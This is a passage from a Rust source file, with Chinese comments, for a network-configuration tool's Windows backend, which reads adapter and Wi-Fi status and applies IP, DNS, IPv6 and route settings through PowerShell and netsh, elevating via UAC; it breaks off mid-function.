//! Windows 平台实现。
//!
//! 设计要点（为什么这么写）：
//!
//! 1. **读取优先走 PowerShell CIM cmdlet**（`Get-NetAdapter` / `Get-NetConnectionProfile`
//!    / `Get-NetIPConfiguration` …）而不是 `netsh` 的文本输出。
//!    原因：`netsh` 的输出是**本地化 + OEM 代码页**的，中文 Windows 下字段名和编码都会变，
//!    解析必然脆。CIM 是对象化的，语言无关，且我们显式把 stdout 编码钉成 UTF-8。
//!
//! 2. **写入走 `netsh`**（`interface ipv4 set address/dnsservers`）—— 这是 Windows 上改
//!    静态 IP/DNS 最稳定的入口。
//!
//! 3. **提权走 UAC**：把要执行的命令渲染成一段 PowerShell 脚本，
//!    用 `-EncodedCommand`（UTF-16LE base64，彻底避开引号/编码问题）交给
//!    `Start-Process -Verb RunAs` 以管理员身份执行，一次授权覆盖本批全部操作。
//!    网络配置批次默认先走常驻 helper（`win_helper`）：同一个会话只弹一次授权，
//!    helper 不可用时才透明退回上面这条逐批弹窗的通路。
//!
//! 4. **命令参数一律用 `@('a','b')` 数组传递**（`& netsh.exe @(...)`），
//!    不做字符串拼接，避免接口名含空格/特殊字符时被重新切分。

use super::{
    poll_ssid_watch, printer_label, run, timeout_secs, Health, InterfaceStatus, NetworkPlatform,
    PrinterInfo, PrivChannel, ProbeTarget, TunnelTarget, WatcherHandle,
};
use crate::config::{Mode, NetworkConfig, V6Mode};
use crate::i18n;
use std::sync::{Mutex, OnceLock};
use std::time::{Duration, Instant};

/// 状态快照缓存 TTL。
/// `resolve_current_name()` 一次要问 SSID + 网关 MAC + BSSID，而每次读取都要拉起一次
/// PowerShell（百毫秒级）。缓存让一次身份解析只付一次进程开销。
const CACHE_TTL: Duration = Duration::from_millis(1200);

fn cache() -> &'static Mutex<Option<(Instant, InterfaceStatus)>> {
    static C: OnceLock<Mutex<Option<(Instant, InterfaceStatus)>>> = OnceLock::new();
    C.get_or_init(|| Mutex::new(None))
}

// —————————————————————————— PowerShell 调用 ——————————————————————————

/// 执行一段 PowerShell 脚本并取回 stdout。
///
/// 脚本首行由本函数统一注入 `[Console]::OutputEncoding = UTF8`，
/// 保证含中文的返回值（SSID、适配器名）在 Rust 侧能正确按 UTF-8 解码。
/// 调用时**不要**在脚本里再执行 `netsh` 等原生命令（它们的输出是 OEM 代码页，
/// 会被 UTF-8 解码器解坏）；需要 netsh 文本时请直接从 Rust 调 `netsh` 并只取 ASCII 字段。
///
/// `pub(crate)` 是给 `win_helper` 拉起 helper 用的（`Start-Process -Verb RunAs` 本身
/// 也得由一条普通权限的 PowerShell 来说）。
pub(crate) fn ps(script: &str) -> Result<String, String> {
    let full = format!(
        "[Console]::OutputEncoding=[System.Text.Encoding]::UTF8;$ProgressPreference='SilentlyContinue';\r\n{}",
        script
    );
    run(
        "powershell.exe",
        &[
            "-NoProfile",
            "-NonInteractive",
            "-ExecutionPolicy",
            "Bypass",
            "-Command",
            &full,
        ],
    )
}

/// PowerShell 单引号字符串字面量（内部 `'` 翻倍转义）。
fn psq(s: &str) -> String {
    format!("'{}'", s.replace('\'', "''"))
}

/// `@('a','b')` —— 参数数组字面量。永远用数组传参，不做字符串拼接。
fn ps_arr(items: &[&str]) -> String {
    let inner: Vec<String> = items.iter().map(|s| psq(s)).collect();
    format!("@({})", inner.join(","))
}

/// 给 **`Start-Process -ArgumentList`** 用的参数数组。与 [`ps_arr`] 不能混用一个：
///
/// `& netsh.exe @(...)` 那条路 PowerShell 会自己替带空格的参数补引号；
/// 而 `Start-Process -ArgumentList @(...)` 是把元素**用空格拼成一条命令行**交给子进程，
/// 补引号是子进程那边按 Win32 规则解析的事 —— 于是 `'C:\Program Files\a.bat'` 会在那里
/// 变成两个参数。这里显式给含空白（或含 `"`）的元素再包一层双引号，内部 `"` 按 `\"` 转义。
/// `pub(crate)` 同样是给 `win_helper` 拉起自身用的。
pub(crate) fn ps_exec_arr(items: &[&str]) -> String {
    let inner: Vec<String> = items.iter().map(|s| ps_exec_arg(s)).collect();
    format!("@({})", inner.join(","))
}

fn ps_exec_arg(s: &str) -> String {
    if !s.chars().any(char::is_whitespace) && !s.contains('"') {
        return psq(s);
    }
    // 外层单引号是 PowerShell 的字面量（内部 `'` 翻倍），里层双引号才是子进程看到的引号
    psq(&format!("\"{}\"", s.replace('"', "\\\"")))
}

/// 一行 `netsh.exe` 调用 + 退出码检查（失败即终止整段脚本，避免"部分成功"被当成功）。
fn netsh_line(args: &[&str]) -> String {
    format!(
        "& netsh.exe {}; if ($LASTEXITCODE -ne 0) {{ throw \"netsh exit $LASTEXITCODE\" }};",
        ps_arr(args)
    )
}

/// `-PrefixLength` 只接受整数。在配置进入 PowerShell 之前把 `v6prefix` 收敛成数字：
/// 既给出按界面语言写出的报错，也彻底排除了向 `-PrefixLength` 后面追加 PowerShell 语句的可能。
fn parse_prefix_len(s: &str) -> Result<String, String> {
    match s.trim().parse::<u32>() {
        Ok(n) if n <= 128 => Ok(n.to_string()),
        Ok(n) => Err(i18n::tf("pal.v6prefix_range", &[("n", &n.to_string())])),
        Err(_) => Err(i18n::tf("pal.v6prefix_not_int", &[("s", s)])),
    }
}

/// 标准 base64 编码（自带实现，避免为一个小工具引入依赖）。
fn base64_encode(data: &[u8]) -> String {
    const T: &[u8; 64] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    let mut out = String::with_capacity(data.len().div_ceil(3) * 4);
    for chunk in data.chunks(3) {
        let b0 = chunk[0] as u32;
        let b1 = *chunk.get(1).unwrap_or(&0) as u32;
        let b2 = *chunk.get(2).unwrap_or(&0) as u32;
        let n = (b0 << 16) | (b1 << 8) | b2;
        out.push(T[((n >> 18) & 63) as usize] as char);
        out.push(T[((n >> 12) & 63) as usize] as char);
        out.push(if chunk.len() > 1 {
            T[((n >> 6) & 63) as usize] as char
        } else {
            '='
        });
        out.push(if chunk.len() > 2 {
            T[(n & 63) as usize] as char
        } else {
            '='
        });
    }
    out
}

/// UTF-16LE + base64，供 PowerShell `-EncodedCommand` 使用。
/// `pub(crate)`：helper 服务端（`win_helper`）执行的就是这条编码通路。
pub(crate) fn encode_command(script: &str) -> String {
    let mut bytes = Vec::with_capacity(script.len() * 2 + 2);
    for u in script.encode_utf16() {
        bytes.extend_from_slice(&u.to_le_bytes());
    }
    base64_encode(&bytes)
}

/// 以管理员身份执行一段 PowerShell 脚本（弹 UAC），失败返回可读错误。
fn run_elevated_ps(body: &str) -> Result<(), String> {
    let inner = format!("$ErrorActionPreference='Stop';\r\n{}\r\n", body);
    let b64 = encode_command(&inner);
    // ExitCode 1223 = ERROR_CANCELLED（用户点了"否"）
    let outer = format!(
        "$ErrorActionPreference='Stop';\
         try {{ $p = Start-Process -FilePath 'powershell.exe' -Verb RunAs -Wait -PassThru -WindowStyle Hidden \
         -ArgumentList @('-NoProfile','-NonInteractive','-ExecutionPolicy','Bypass','-EncodedCommand','{}'); \
         exit $p.ExitCode }} catch {{ exit 1223 }}",
        b64
    );
    match run(
        "powershell.exe",
        &[
            "-NoProfile",
            "-NonInteractive",
            "-ExecutionPolicy",
            "Bypass",
            "-Command",
            &outer,
        ],
    ) {
        Ok(_) => Ok(()),
        Err(e) => Err(uac_cancelled(e)),
    }
}

/// UAC 被用户点掉时的那条报错（外层脚本把取消编码成退出码 1223 = ERROR_CANCELLED）。
/// `pub(crate)` 也给 `win_helper` 复用：拉起 helper 被取消时的口径必须和这里一致。
pub(crate) fn uac_cancelled(e: String) -> String {
    if e.contains("1223") {
        i18n::t("pal.uac_cancelled")
    } else {
        i18n::tf("pal.elevate_failed", &[("error", &e)])
    }
}

/// 以管理员身份执行**一个目标程序**（用户脚本走这条），全程只弹一次 UAC。
///
/// 为什么不复用 [`run_elevated_ps`]：那条是「先提权一个 powershell，再把脚本丢给它」，
/// 而已经提权的进程里再来一次 `-Verb RunAs` 会弹**第二个**授权框 —— 用户在两秒内看到
/// 两个一模一样的框，第一反应是自己点错了什么。这里让那个普通的 powershell 直接提权
/// 目标本身：一次授权，目标退出码照样拿得回来。
fn run_elevated_target(file: &str, args: &[&str]) -> Result<(), String> {
    let script = format!(
        "$ErrorActionPreference='Stop';\
         try {{ $p = Start-Process -FilePath {} -ArgumentList {} -Verb RunAs -Wait -PassThru; \
         exit $p.ExitCode }} catch {{ exit 1223 }}",
        psq(file),
        ps_exec_arr(args)
    );
    match ps(&script) {
        Ok(_) => Ok(()),
        Err(e) => Err(uac_cancelled(e)),
    }
}

/// 当前是否以管理员身份运行（决定 `PrivChannel`）。
fn is_admin() -> bool {
    // 用 .NET 判组身份，比 `net session` 之类的探测更快且无副作用。
    ps("$id=[Security.Principal.WindowsIdentity]::GetCurrent();\
        $p=New-Object Security.Principal.WindowsPrincipal($id);\
        if ($p.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) { '1' } else { '0' }")
        .map(|s| s.trim() == "1")
        .unwrap_or(false)
}

/// 当前特权通道：已是管理员 → Direct（无弹窗）；否则 → Prompt（UAC）。
pub fn priv_channel() -> PrivChannel {
    static C: OnceLock<PrivChannel> = OnceLock::new();
    *C.get_or_init(|| {
        if is_admin() {
            PrivChannel::Direct
        } else {
            PrivChannel::Prompt
        }
    })
}

// —————————————————————————— 读取：接口与状态 ——————————————————————————

/// 解析 CIM 查询返回的 JSON 对象（取第一条记录）。
fn parse_json_object(out: &str) -> Option<serde_json::Value> {
    let t = out.trim();
    if t.is_empty() {
        return None;
    }
    serde_json::from_str::<serde_json::Value>(t).ok()
}

/// 当前无线适配器名。`MediaType = 'Native 802.11'` 是 Wi-Fi 的语言无关判据。
fn wifi_iface() -> Option<String> {
    let out = ps("$ErrorActionPreference='SilentlyContinue';\
         $a = Get-NetAdapter -Physical | Where-Object { $_.MediaType -eq 'Native 802.11' } | Select-Object -First 1;\
         if (-not $a) { $a = Get-NetAdapter | Where-Object { $_.Name -match 'Wi-?Fi|WLAN|Wireless' } | Select-Object -First 1 };\
         if ($a) { $a.Name }")
    .ok()?;
    let name = out.lines().map(|l| l.trim()).find(|l| !l.is_empty())?;
    Some(name.to_string())
}

/// 读取一次完整状态快照（一次 PowerShell 调用取全部字段）。
fn read_status() -> InterfaceStatus {
    let script = r#"$ErrorActionPreference='SilentlyContinue';
$ad = Get-NetAdapter -Physical | Where-Object { $_.MediaType -eq 'Native 802.11' } | Select-Object -First 1;
if (-not $ad) { $ad = Get-NetAdapter | Where-Object { $_.Name -match 'Wi-?Fi|WLAN|Wireless' } | Select-Object -First 1 }
if (-not $ad) { '{}' ; exit }
$idx = $ad.ifIndex;
$prof = Get-NetConnectionProfile -InterfaceIndex $idx;
$ip   = Get-NetIPAddress -InterfaceIndex $idx -AddressFamily IPv4 | Where-Object { $_.PrefixOrigin -ne 'WellKnown' } | Select-Object -First 1;
$dns  = Get-DnsClientServerAddress -InterfaceIndex $idx -AddressFamily IPv4;
$v6   = Get-NetIPInterface -InterfaceIndex $idx -AddressFamily IPv6 | Select-Object -First 1;
$rt   = Get-NetRoute -InterfaceIndex $idx -AddressFamily IPv4 -DestinationPrefix '0.0.0.0/0' | Sort-Object RouteMetric | Select-Object -First 1;
[pscustomobject]@{
  iface   = $ad.Name;
  ssid    = $prof.Name;
  ipv4    = $ip.IPAddress;
  prefix  = $ip.PrefixLength;
  gateway = $rt.NextHop;
  dns     = ($dns.ServerAddresses -join ',');
  v6dhcp  = $v6.Dhcp
} | ConvertTo-Json -Compress"#;

    let mut st = InterfaceStatus::default();
    let Some(v) = ps(script).ok().and_then(|o| parse_json_object(&o)) else {
        return st;
    };
    let get = |k: &str| -> Option<String> {
        v.get(k)
            .and_then(|x| x.as_str())
            .map(|s| s.trim().to_string())
            .filter(|s| !s.is_empty())
    };

    st.iface = get("iface");
    st.ssid = get("ssid");
    st.connected = st.ssid.is_some();
    st.ipv4 = get("ipv4");
    st.gateway = get("gateway");
    st.dns = get("dns");
    st.netmask = v
        .get("prefix")
        .and_then(|x| x.as_u64())
        .and_then(|p| prefix_to_mask(p as u32));
    st.v6mode = match get("v6dhcp").as_deref() {
        Some("Enabled") => Some("automatic".to_string()),
        Some("Disabled") => Some("manual".to_string()),
        _ => None,
    };

    // BSSID / 信号强度：只从 netsh 文本里取 ASCII 字段（MAC、百分比），
    // 因此不受中文 Windows 的本地化/代码页影响。
    //
    // 注意这里用 `has_iface` 布尔量而不是 `if let Some(x) = &st.iface`：
    // 后者会让 `st.iface` 在整个块内保持不可变借用，而块内又要写 `st.bssid` 等字段，
    // 触发 E0502（借用了 st 又可变借用 st）。
    if st.iface.is_some() {
        if let Ok(text) = run("netsh", &["wlan", "show", "interfaces"]) {
            for line in text.lines() {
                // BSSID 行：字段名保持英文
                if line.contains("BSSID") {
                    if let Some(m) = super::extract_mac(line) {
                        st.bssid = Some(m);
                    }
                }
                // 信号行：取行内第一个 `NN%`
                if st.rssi.is_none() {
                    if let Some(pct) = percent_in(line) {
                        // 百分比 → dBm 近似：dBm ≈ pct/2 - 100（微软官方给出的换算关系）
                        st.rssi = Some(pct / 2 - 100);
                    }
                }
            }
        }
        // 先算成 owned 值再赋值，避免同时借用 st.gateway 与写 st.gateway_mac
        let gm = st.gateway.as_deref().and_then(gateway_mac_for);
        st.gateway_mac = gm;
    }
    st
}

/// 取行内第一个 `NN%` 的数值。
fn percent_in(line: &str) -> Option<i32> {
    let bytes = line.as_bytes();
    let mut i = 0;
    while i < bytes.len() {
        if bytes[i] == b'%' {
            // 向前回溯数字
            let mut j = i;
            while j > 0 && bytes[j - 1].is_ascii_digit() {
                j -= 1;
            }
            if j < i {
                return std::str::from_utf8(&bytes[j..i]).ok()?.parse::<i32>().ok();
            }
        }
        i += 1;
    }
    None
}

/// 前缀长度 → 点分掩码。
fn prefix_to_mask(prefix: u32) -> Option<String> {
    if prefix > 32 {
        return None;
    }
    let bits: u32 = if prefix == 0 {
        0
    } else {
        u32::MAX << (32 - prefix)
    };
    Some(format!(
        "{}.{}.{}.{}",
        (bits >> 24) & 0xFF,
        (bits >> 16) & 0xFF,
        (bits >> 8) & 0xFF,
        bits & 0xFF
    ))
}

/// 一行网卡快照（脚本 `NIC_ROWS_PS_BODY` 的一个对象）→ 界面用的 `NicInfo`。
///
/// 返回 `None` 表示这一行**没有可核对的信息**：一张没在用、也没有地址的适配器，
/// 出现在清单上只会挤掉真正那几张。例外是 VPN —— 没连上的隧道同样值得列出来，
/// 因为「装了但没连」正是 3B2 与托盘都要看见的状态。
///
/// `up` 取自 `Status`，不再写死 `true`：以前能进到这个函数的行必然是 `Up`（筛选在
/// PowerShell 里做完了），所以现在多了「已知的虚拟口」这一类，状态必须原样带出来。
fn nic_from_row(r: &serde_json::Value) -> Option<super::NicInfo> {
    let get = |k: &str| -> Option<String> {
        r.get(k)
            .and_then(|x| x.as_str())
            .map(|s| s.trim().to_string())
            .filter(|s| !s.is_empty())
    };
    let name = get("name")?;
    let ipv4 = get("ip");
    let ipv6 = get("v6");
    let media = get("media").unwrap_or_default();
    let desc = get("desc").unwrap_or_default();
    let ssid = get("ssid");
    let up = get("status").is_some_and(|s| s.eq_ignore_ascii_case("Up"));

    let kind = if media == "Native 802.11" {
        super::NicKind::Wireless
    } else if super::guess_vpn_app(&desc).is_some() || super::guess_vpn_app(&name).is_some() {
        super::NicKind::Vpn
    } else if media == "802.3" || desc.to_ascii_lowercase().contains("ethernet") {
        super::NicKind::Wired
    } else {
        super::NicKind::Other
    };
    if kind != super::NicKind::Vpn && ipv4.is_none() && ipv6.is_none() && ssid.is_none() {
        return None;
    }

    let gateway = get("gw");
    let gateway_mac = gateway.as_deref().and_then(gateway_mac_for);
    let netmask = r
        .get("prefix")
        .and_then(|x| x.as_u64())
        .and_then(|p| prefix_to_mask(p as u32));

    // VPN 归属要在 `name` 搬进 `NicInfo` 之前算完：这个函数只有 Windows 腿会编译，
    // 写在字面量字段里就是一次 use-after-move。
    let app = if kind == super::NicKind::Vpn {
        super::guess_vpn_app(&desc)
            .or_else(|| super::guess_vpn_app(&name))
            .map(|s| s.to_string())
    } else {
        None
    };

    Some(super::NicInfo {
        name,
        label: if desc.is_empty() { None } else { Some(desc) },
        kind,
        up,
        ssid: if kind == super::NicKind::Wireless { ssid } else { None },
        mac: get("mac"),
        ipv4,
        netmask,
        ipv6,
        gateway,
        gateway_mac,
        dns: get("dns"),
        app,
    })
}

/// 网关 IP → MAC（`arp -a` 邻居表；输出仅取 MAC 形态字符串，编码无关）。
fn gateway_mac_for(gw: &str) -> Option<String> {
    let out = run("arp", &["-a"]).ok()?;
    for line in out.lines() {
        if !has_ip_token(line, gw) {
            continue;
        }
        if let Some(m) = super::extract_mac(line) {
            return Some(m);
        }
    }
    None
}

/// 行内是否出现**独立成词**的该 IP 串。
///
/// 不能用 `line.contains(gw)`：网关 `192.168.1.1` 会命中本机地址 `192.168.1.10`
/// 所在的行，于是 `arp -a` 的**接口表头**「接口: 192.168.1.10 --- 0x10」也被拉进
/// 扫描 —— 那行整行是中文（CP936 → U+FFFD），这正是启动即退的实际触发点；
/// 更隐蔽的是当网关是 `10.0.0.1` 时会命中 `10.0.0.10` 那一行，把**别的邻居**
/// 的 MAC 当成网关 MAC 返回（错配到错误的 profile）。
///
/// 按"非 IP 字符"切词再整体比较，前缀误命中自然消失，且不受本地化影响。
fn has_ip_token(line: &str, ip: &str) -> bool {
    // 空网关必须直接判否：否则空 token 会让每一行都命中
    !ip.is_empty()
        && line
            .split(|c: char| !c.is_ascii_digit() && c != '.')
            .any(|tok| tok == ip)
}

/// 带 TTL 的状态快照（避免一次身份解析触发多次 PowerShell 启动）。
fn status_cached() -> InterfaceStatus {
    let mut c = cache().lock().unwrap_or_else(|e| e.into_inner());
    if let Some((t, st)) = c.as_ref() {
        if t.elapsed() < CACHE_TTL {
            return st.clone();
        }
    }
    let st = read_status();
    *c = Some((Instant::now(), st.clone()));
    st
}

fn invalidate_cache() {
    *cache().lock().unwrap_or_else(|e| e.into_inner()) = None;
}

// —————————————————————————— 写入：结构化操作 ——————————————————————————

/// 结构化特权操作（Windows 版）。渲染成 PowerShell 脚本后经 UAC 执行。
#[derive(Debug, PartialEq, Eq)]
enum WinOp {
    SetDhcp { iface: String },
    SetManual {
        iface: String,
        ip: String,
        mask: String,
        gw: String,
    },
    SetDns {
        iface: String,
        servers: Vec<String>,
    },
    SetV6Off { iface: String },
    SetV6Auto { iface: String },
    SetV6Manual {
        iface: String,
        addr: String,
        prefix: String,
        gw: String,
    },
    RouteAdd {
        iface: String,
        dest: String,
        gw: Option<String>,
        metric: u32,
    },
    RouteDelete { dest: String },
}

impl WinOp {
    fn render(&self) -> String {
        match self {
            WinOp::SetDhcp { iface } => netsh_line(&[
                "interface",
                "ipv4",
                "set",
                "address",
                &format!("name={}", iface),
                "source=dhcp",
            ]),
            WinOp::SetManual {
                iface,
                ip,
                mask,
                gw,
            } => netsh_line(&[
                "interface",
                "ipv4",
                "set",
                "address",
                &format!("name={}", iface),
                "static",
                ip,
                mask,
                gw,
            ]),
            WinOp::SetDns { iface, servers } => {
                let n = format!("name={}", iface);
                if servers.is_empty() {
                    netsh_line(&["interface", "ipv4", "set", "dnsservers", &n, "source=dhcp"])
                } else {
                    let mut s = netsh_line(&[
                        "interface", "ipv4", "set", "dnsservers", &n, "static", &servers[0],
                        "primary",
                    ]);
                    for (i, sv) in servers.iter().enumerate().skip(1) {
                        s.push_str(&netsh_line(&[
                            "interface",
                            "ipv4",
                            "add",
                            "dnsservers",
                            &n,
                            sv,
                            &format!("index={}", i + 1),
                        ]));
                    }
                    s
                }
            }
            // 关闭 IPv6：禁用适配器上的 ms_tcpip6 绑定（等价于"关掉 IPv6"）
            WinOp::SetV6Off { iface } => format!(
                "Disable-NetAdapterBinding -Name {} -ComponentID ms_tcpip6 -ErrorAction Stop;",
                psq(iface)
            ),
            WinOp::SetV6Auto { iface } => format!(
                "Enable-NetAdapterBinding -Name {} -ComponentID ms_tcpip6 -ErrorAction SilentlyContinue;\
                 Set-NetIPInterface -InterfaceAlias {} -AddressFamily IPv6 -Dhcp Enabled -ErrorAction SilentlyContinue;",
                psq(iface),
                psq(iface)
            ),
            WinOp::SetV6Manual {
                iface,
                addr,
                prefix,
                gw,
            } => format!(
                "Get-NetIPAddress -InterfaceAlias {} -AddressFamily IPv6 -ErrorAction SilentlyContinue \
                   | Where-Object {{ $_.PrefixOrigin -ne 'WellKnown' }} | Remove-NetIPAddress -Confirm:$false -ErrorAction SilentlyContinue;\
                 Enable-NetAdapterBinding -Name {} -ComponentID ms_tcpip6 -ErrorAction SilentlyContinue;\
                 New-NetIPAddress -InterfaceAlias {} -IPAddress {} -PrefixLength {} -DefaultGateway {} -ErrorAction Stop | Out-Null;",
                psq(iface),
                psq(iface),
                 psq(iface),
                 psq(addr),
                 psq(prefix),
                 psq(gw)
            ),
            WinOp::RouteAdd {
                iface,
                dest,
                gw,
                metric,
            } => {
                // 先删同名路由，避免重复添加报错（幂等）
                let mut s = format!(
                    "Remove-NetRoute -DestinationPrefix {} -Confirm:$false -ErrorAction SilentlyContinue;",
                    psq(dest)
                );
                let next_hop = match gw {
                    Some(g) if !g.is_empty() => format!(" -NextHop {}", psq(g)),
                    _ => String::new(),
                };
                s.push_str(&format!(
                    "New-NetRoute -DestinationPrefix {} -InterfaceAlias {}{} -RouteMetric {} -ErrorAction Stop | Out-Null;",
                    psq(dest),
                    psq(iface),
                    next_hop,
                    metric
                ));
                s
            }
            WinOp::RouteDelete { dest } => format!(
                "$r = Get-NetRoute -DestinationPrefix {} -ErrorAction SilentlyContinue;\
                 if ($r) {{ $r | Remove-NetRoute -Confirm:$false -ErrorAction Stop }};",
                psq(dest)
            ),
        }
    }
}

/// 批量执行特权操作（一次 UAC 授权覆盖整批）。
fn exec_ops(ops: &[WinOp]) -> Result<(), String> {
    if ops.is_empty() {
        return Ok(());
    }
    let body: String = ops.iter().map(|o| o.render()).collect::<Vec<_>>().join("\r\n");
    // 优先交给常驻 helper（见 `super::win_helper`）：授权从「每批一次」降到「每会话一次」，
    // 执行的本就是同一份 PowerShell。够不着 helper 才退回原来的逐批 `run_elevated_ps`。
    // 已是管理员（Direct）时 -Verb RunAs 本就不弹窗，不必多绕一条管道。
    let r = if matches!(priv_channel(), PrivChannel::Prompt) {
        match super::win_helper::run_batch(&body) {
            super::win_helper::Outcome::Done(r) => r,
            super::win_helper::Outcome::Unavailable => run_elevated_ps(&body),
        }
    } else {
        run_elevated_ps(&body)
    };
    invalidate_cache();
    r
}

/// 把一份配置编译成按序执行的特权操作，不做任何 I/O。
///
/// DNS 是三态字段：`dns` 缺失就不产生 DNS 操作（网卡上现在挂着什么就继续用什么），
/// `dns: ""` 才渲染成 `set dnsservers … source=dhcp` 这条清空指令。
fn apply_ops(iface: &str, p: &NetworkConfig) -> Result<Vec<WinOp>, String> {
    let mut ops: Vec<WinOp> = Vec::new();
    match p.mode {
        Mode::Manual => {
            let ip = p
                .ip
                .clone()
                .ok_or_else(|| i18n::tf("pal.manual_missing", &[("field", "ip")]))?;
            let mask = p
                .netmask
                .clone()
                .ok_or_else(|| i18n::tf("pal.manual_missing", &[("field", "netmask")]))?;
            let gw = p
                .gateway
                .clone()
                .ok_or_else(|| i18n::tf("pal.manual_missing", &[("field", "gateway")]))?;
            ops.push(WinOp::SetManual {
                iface: iface.to_string(),
                ip,
                mask,
                gw,
            });
        }
        Mode::Dhcp => ops.push(WinOp::SetDhcp {
            iface: iface.to_string(),
        }),
    }
    if let Some(dns) = p.dns.as_deref() {
        let servers: Vec<String> = dns
            .split(',')
            .map(|s| s.trim().to_string())
            .filter(|s| !s.is_empty())
            .collect();
        ops.push(WinOp::SetDns {
            iface: iface.to_string(),
            servers,
        });
    }
    match p.v6mode {
        Some(V6Mode::Off) => ops.push(WinOp::SetV6Off {
            iface: iface.to_string(),
        }),
        Some(V6Mode::Automatic) => ops.push(WinOp::SetV6Auto {
            iface: iface.to_string(),
        }),
        Some(V6Mode::Manual) => {
            let addr = p
                .ipv6
                .clone()
                .ok_or_else(|| i18n::tf("pal.v6_manual_missing", &[("field", "ipv6")]))?;
            let raw = p
                .v6prefix
                .clone()
                .ok_or_else(|| i18n::tf("pal.v6_manual_missing", &[("field", "v6prefix")]))?;
            let prefix = parse_prefix_len(&raw)?;
            let gw = p
                .v6gateway
                .clone()
                .ok_or_else(|| i18n::tf("pal.v6_manual_missing", &[("field", "v6gateway")]))?;
            ops.push(WinOp::SetV6Manual {
                iface: iface.to_string(),
                addr,
                prefix,
                gw,
            });
        }
        None => {}
    }
    Ok(ops)
}

// —————————————————————————— WebView2 运行时 ——————————————————————————

/// WebView2 运行时是否已安装。
///
/// 判据（任一命中即视为已安装）：
///   1. 磁盘上存在 `msedgewebview2.exe`。Evergreen 运行时的标准安装位置是
///      per-machine `C:\Program Files (x86)\Microsoft\EdgeWebView\Application\<版本>\`，
///      per-user `%LOCALAPPDATA%\Microsoft\EdgeWebView\Application\<版本>\`；
///   2. 注册表 `Microsoft\EdgeUpdate\Clients\{F3017226-FE2A-4295-8BDF-00C3A9A7E4C5}`
///      下存在 `pv` 值（HKLM 的 WOW6432Node 视图 + HKCU 各查一次）。
///
/// 为什么自己判：安装包把 `bundle.windows.webviewInstallMode` 设为 `skip`（不再内嵌
/// 完整的 WebView2 运行时，setup.exe 从 ~218MB 降到几 MB）。代价是**必须**在本机缺少
/// 运行时时给用户一个可操作的提示 —— 否则 Tauri 创建 WebView 失败，进程静默退出，
/// 用户只会看到「装完打不开」。这里正是那个提示的判据。
///
/// 磁盘检查放在前面：它不需要拉起子进程，绝大多数机器上第一次就命中。
pub fn webview2_available() -> bool {
    if webview2_on_disk() {
        return true;
    }
    // 注册表兜底（覆盖运行时被装到非标准路径、或只写了注册表的情况）。
    // 用 reg.exe 而不是 winreg FFI：零依赖，且 reg 的退出码就是现成的存在性判据。
    const SUBKEY: &str = r"Microsoft\EdgeUpdate\Clients\{F3017226-FE2A-4295-8BDF-00C3A9A7E4C5}";
    let hklm = format!(r"SOFTWARE\WOW6432Node\{}", SUBKEY);
    let hkcu = format!(r"SOFTWARE\{}", SUBKEY);
    run("reg", &["query", &hklm, "/v", "pv"]).is_ok()
        || run("reg", &["query", &hkcu, "/v", "pv"]).is_ok()
}

/// 在 Evergreen 运行时的标准安装位置下找 `msedgewebview2.exe`。
fn webview2_on_disk() -> bool {
    let mut roots: Vec<std::path::PathBuf> = Vec::new();
    for var in ["ProgramFiles(x86)", "ProgramFiles", "LOCALAPPDATA"] {
        if let Some(base) = std::env::var_os(var) {
            roots.push(
                std::path::PathBuf::from(base)
                    .join("Microsoft")
                    .join("EdgeWebView")
                    .join("Application"),
            );
        }
    }
    for root in roots {
        // 目录不存在（未安装）是正常情况，直接跳过
        let Ok(entries) = std::fs::read_dir(&root) else {
            continue;
        };
        for e in entries.flatten() {
            if e.path().join("msedgewebview2.exe").is_file() {
                return true;
            }
        }
    }
    false
}

// —————————————————————————— Windows 实现 ——————————————————————————

/// 无状态：`Copy` 让它可以按值传给后台线程（健康度监测）而不必套 `Arc`。
#[derive(Debug, Clone, Copy)]
pub struct WindowsPlatform;

/// 一块网卡适配器的匹配结果。
struct WinAdapter {
    /// `Get-NetAdapter` 的 `Status` 为 `Up`
    up: bool,
    /// 厂商提示是否落在这块适配器的描述里
    provider_matched: bool,
    name: String,
    desc: String,
}

/// 切 `name|status|description` 行。描述里可以有 `|`（`splitn` 保住整段描述），
/// 名字段为空则整行丢弃（PowerShell 出错时习惯输出空行）。
fn parse_adapter_lines(out: &str) -> Vec<(String, String, String)> {
    out.lines()
        .filter_map(|l| {
            let mut it = l.splitn(3, '|');
            let name = it.next()?.trim().to_string();
            let status = it.next()?.trim().to_string();
            let desc = it.next().unwrap_or("").trim().to_string();
            (!name.is_empty()).then_some((name, status, desc))
        })
        .collect()
}

/// 一次 PowerShell 取回全部适配器（名字 / 状态 / 描述），在 Rust 侧做匹配。
///
/// 为什么不在 PowerShell 里 `Where-Object { $_.Name -eq <目标> }`：那样「找不到」和
/// 「命令本身失败」都会退化成空输出，而这两件事对用户的意义完全相反
/// （前者是配置写错了名字，后者是这台机器上 PowerShell 用不了）。
fn win_adapters() -> Vec<(String, String, String)> {
    let script = "$ErrorActionPreference='SilentlyContinue';\
Get-NetAdapter | ForEach-Object { $_.Name + '|' + $_.Status + '|' + $_.InterfaceDescription }";
    parse_adapter_lines(&ps(script).unwrap_or_default())
}

/// 目标隧道对应的适配器。`None` = 这台机器上没有这块网卡。
///
/// Windows 上两类隧道都表现为「一块网卡」：WireGuard 建的适配器名就是隧道名，
/// VPN 拨号连接同理，所以两种 `TunnelTarget` 的检测不必分叉。
fn win_adapter(target: &TunnelTarget) -> Option<WinAdapter> {
    let adapters = win_adapters();
    let by_name = |name: &str| super::tunnel_name_eq(name, target.name());
    let hit = adapters
        .iter()
        .find(|(name, _, desc)| by_name(name) && super::provider_in(target.provider(), desc))
        .or_else(|| adapters.iter().find(|(name, _, _)| by_name(name)))?;
    Some(WinAdapter {
        up: hit.1.eq_ignore_ascii_case("up"),
        provider_matched: super::provider_in(target.provider(), &hit.2),
        name: hit.0.clone(),
        desc: hit.2.clone(),
    })
}

/// 这台机器上 WireGuard 的隧道配置目录（`%PROGRAMDATA%\WireGuard\WiredTunnels`）。
fn wireguard_conf_dir() -> Option<std::path::PathBuf> {
    let base = std::env::var_os("PROGRAMDATA")?;
    Some(std::path::Path::new(&base).join("WireGuard").join("WiredTunnels"))
}

/// WireGuard 官方命令行入口。装在其他位置时退化为 PATH 上的 `wireguard.exe`。
fn wireguard_exe() -> String {
    for cand in [
        std::env::var("PROGRAMFILES")
            .map(|p| format!("{}\\WireGuard\\wireguard.exe", p))
            .unwrap_or_default(),
